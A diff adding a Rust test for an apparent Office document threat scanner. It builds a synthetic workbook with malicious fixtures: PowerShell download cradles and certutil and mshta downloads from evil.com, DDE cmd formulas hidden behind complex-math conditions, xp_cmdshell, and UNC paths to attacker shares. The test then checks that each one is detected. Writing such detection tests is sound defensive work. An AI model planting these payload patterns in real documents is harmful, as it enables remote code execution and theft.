@@ -5810,3 +5810,232 @@ fn e2e_docvars_powerpoint_scenarios_and_complex_math_threat_inspection() {
         "JSON missing VBA-CELL-061"
     );
 }
+
+#[test]
+fn e2e_animation_watermark_datamodel_and_complex_math_threat_inspection() {
+    let ppt_slide1 = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<p:sld xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
+  <p:timing>
+    <p:tnLst>
+      <p:cTn id="1">
+        <p:childTnLst>
+          <p:cmd type="call" cmd="powershell.exe -enc AAAA"/>
+          <p:cMediaNode>
+            <p:cTn id="2"/>
+            <p:tgtEl>
+              <p:spTgt spid="3"/>
+            </p:tgtEl>
+            <p:media target="\\evil-share\payload.mp4"/>
+          </p:cMediaNode>
+        </p:childTnLst>
+      </p:cTn>
+    </p:tnLst>
+  </p:timing>
+</p:sld>"#;
+
+    let ppt_slide1_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/media" Target="\\attacker\share\drop.exe"/>
+</Relationships>"#;
+
+    let word_header1 = r##"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:hdr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:v="urn:schemas-microsoft-com:vml">
+  <w:p>
+    <w:r>
+      <w:pict>
+        <v:shape id="Watermark" type="#_x0000_t75">
+          <v:imagedata src="\\attacker\leak\watermark.png"/>
+        </v:shape>
+      </w:pict>
+    </w:r>
+  </w:p>
+</w:hdr>"##;
+
+    let word_header1_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="update.bat"/>
+</Relationships>"#;
+
+    let word_footer1 = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:ftr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+  <w:p>
+    <w:r>
+      <w:t>powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com')"</w:t>
+    </w:r>
+  </w:p>
+</w:ftr>"#;
+
+    let data_model_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<dataModel xmlns="http://schemas.microsoft.com/office/spreadsheetml/2011/1/dataModel">
+  <connection connection="\\attacker\leak;provider=sqloledb" name="EvilConn">
+    <command>xp_cmdshell 'powershell'</command>
+  </connection>
+</dataModel>"#;
+
+    let src = "Sub Safe()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let cfb = synthesize_cfb_project(
+        "AnimationWatermarkProj",
+        &[("ThisWorkbook", src, &pcode)],
+        &["Safe"],
+    );
+
+    // Formulas exercising IMSUM, IMPRODUCT, PERMUTATIONA, COMBINA, ISODD for de-obfuscation
+    let sheet1_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1"><f>IF(IMREAL(IMSUM(&quot;60+2i&quot;, &quot;5+3i&quot;))=65, &quot;cmd|'/c calc'!A1&quot;, &quot;&quot;)</f></c>
+      <c r="B1"><f>CONCAT(IF(IMAGINARY(IMPRODUCT(&quot;1+2i&quot;, &quot;3+4i&quot;))=10, &quot;powershell&quot;, &quot;&quot;), IF(PERMUTATIONA(3, 2)=9, &quot; -enc&quot;, &quot;&quot;))</f></c>
+      <c r="C1"><f>IF(COMBINA(4, 3)=20, &quot;certutil -urlcache -split -f http://evil.com/payload.exe&quot;, &quot;&quot;)</f></c>
+      <c r="D1"><f>IF(ISODD(3), &quot;mshta http://evil.com/hta&quot;, &quot;&quot;)</f></c>
+      <c r="E1"><f t="shared">cmd|'/c calc'!A0</f></c>
+    </row>
+  </sheetData>
+</worksheet>"#;
+
+    let workbook_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheets>
+    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+  </sheets>
+</workbook>"#;
+
+    let content_types = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
+  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
+  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
+</Types>"#;
+
+    let root_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>"#;
+
+    let workbook_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
+</Relationships>"#;
+
+    let entries: &[(&str, &[u8])] = &[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", root_rels.as_bytes()),
+        ("xl/workbook.xml", workbook_xml.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", workbook_rels.as_bytes()),
+        ("xl/vbaProject.bin", cfb.as_slice()),
+        ("xl/worksheets/sheet1.xml", sheet1_xml.as_bytes()),
+        ("ppt/slides/slide1.xml", ppt_slide1.as_bytes()),
+        (
+            "ppt/slides/_rels/slide1.xml.rels",
+            ppt_slide1_rels.as_bytes(),
+        ),
+        ("word/header1.xml", word_header1.as_bytes()),
+        ("word/_rels/header1.xml.rels", word_header1_rels.as_bytes()),
+        ("word/footer1.xml", word_footer1.as_bytes()),
+        ("xl/model/dataModel.xml", data_model_xml.as_bytes()),
+    ];
+
+    let zip_bytes = synthesize_zip(entries);
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&zip_bytes, &options).expect("inspection should succeed");
+
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify PowerPoint Animation & TimeNode threats (VBA-CELL-062)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "PowerPointAnimationOrTimeNodeAnomaly"
+                && (t.coordinate.contains("animation:cmdCall")
+                    || t.coordinate.contains("animation:uncMedia"))),
+        "Should detect PowerPointAnimationOrTimeNodeAnomaly (VBA-CELL-062): {threats:?}"
+    );
+
+    // 2. Verify Word Header/Footer & Watermark threats (VBA-CELL-063)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "WordHeaderFooterOrWatermarkAnomaly"
+                && (t.coordinate.contains("headerFooter:uncWatermark")
+                    || t.coordinate.contains("headerFooter:executableTarget")
+                    || t.coordinate.contains("headerFooter:shellCommand"))),
+        "Should detect WordHeaderFooterOrWatermarkAnomaly (VBA-CELL-063): {threats:?}"
+    );
+
+    // 3. Verify Excel DataModel & Shared Formula Cache threats (VBA-CELL-064)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "ExcelDataModelOrFormulaCacheAnomaly"
+                && (t.coordinate.contains("dataModel:uncConnection")
+                    || t.coordinate.contains("dataModel:databaseCommand")
+                    || t.coordinate.contains("formulaCache:cloakedExecution"))),
+        "Should detect ExcelDataModelOrFormulaCacheAnomaly (VBA-CELL-064): {threats:?}"
+    );
+
+    // 4. Verify mathematical formula de-obfuscation in cells
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && (t.threat_kind == "DDE"
+                || t.threat_kind == "DDEExecutionFormula"
+                || t.threat_kind == "DeobfuscatedThreat")
+            && t.formula.contains("cmd")),
+        "Cell A1 should resolve DDE cmd execution threat through IMSUM/IMREAL: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "B1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("powershell")),
+        "Cell B1 should resolve powershell threat through IMPRODUCT/PERMUTATIONA evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "C1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("certutil")),
+        "Cell C1 should resolve certutil threat through COMBINA evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "D1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("mshta")),
+        "Cell D1 should resolve mshta threat through ISODD evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF contains rules VBA-CELL-062, VBA-CELL-063, VBA-CELL-064
+    let sarif = inspection_to_sarif(
+        &inspection,
+        "file:///test/animation_watermark_datamodel.xlsm",
+    );
+    assert!(
+        sarif.contains("VBA-CELL-062"),
+        "SARIF must contain VBA-CELL-062 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-063"),
+        "SARIF must contain VBA-CELL-063 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-064"),
+        "SARIF must contain VBA-CELL-064 rule"
+    );
+
+    // 6. Verify JSON contains rule_id VBA-CELL-062, VBA-CELL-063, VBA-CELL-064
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-062\""),
+        "JSON missing VBA-CELL-062"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-063\""),
+        "JSON missing VBA-CELL-063"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-064\""),
+        "JSON missing VBA-CELL-064"
+    );
+}
